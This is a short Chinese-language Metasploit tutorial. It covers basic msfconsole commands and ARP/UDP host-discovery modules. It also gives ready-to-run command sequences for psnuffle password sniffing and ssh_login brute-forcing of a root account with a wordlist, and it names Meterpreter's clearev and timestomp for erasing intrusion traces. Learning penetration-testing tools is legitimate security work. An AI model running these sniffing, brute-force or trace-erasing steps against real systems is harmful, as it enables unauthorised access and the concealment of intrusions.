# **Metasploit**

`msfconsole`进入界面，Metasploit的辅助模块中提供了几款实用的端口扫描器。在线手册

https://www.offensive-security.com/metasploit-unleashed/

## 常用命令使用方法

```
search 搜索模块
use 利用模块
show options 显示模块需要的参数
set 设置参数
run 启动 
```

## 主机扫描

Metasploit中提供了辅助模块用于活跃主机的探测，这些模块位于Metasploit源码路径的modules/auxiliary/scanner/discovery/目录中，主要有以下几个：
```
arp-sweep
ipv6_multicast_ping
ipv6_neighbonip
ipv6_neighbor_router_advertisement
udp_probe
udp_sweep

两个常用模块的说明如下：

arp-sweep：使用ARP请求枚举本地局域网络中的所有活跃主机。
udp-sweep通过发送UDP数据包探查指定主机是否活跃，并发现主机上的UDP服务。
```
在TCP/IP网络环境中，一台主机在发送数据帧前需要使用ARP（Address Resolution Protocol,地址解析协议）将目标地址转换成MAC地址，这个转换过程是通过发送一个ARP请求来完成的。如IP为A的主机发送一个ARP请求获取IP为B的MAC地址，此时如果IP为B的主机存在，那么它会向A发出一个回应。因此，可以通过发送ARP请求的方式很容易地获取同一子网上的活跃主机情况，这种技术也称为ARP扫描。

## 口令嗅探爆破

msf中与嗅探相关的模块可以通过sniffer搜索，

### **psnuffle 口令嗅探**

```
>use auxiliary/sniffer/psnuffle
>show options
>run
```

### **ssh_login 口令爆破**

```
>use auxiliary/scanner/ssh/ssh_login
>set RHOSTS 172.18.0.6
>set THREADS 50
>set PASS_FILE /usr/share/wordlists/sqlmap.txt
>set USERNAME root
>run
```

### Meterpreter

一个用于后渗透测试的辅助模块，可以生成可执行文件对目标主机进行一系列操作。

```
1、clearev命令:清除入侵痕迹
2、timestomp命令：改变文件的修改或访问时间
```
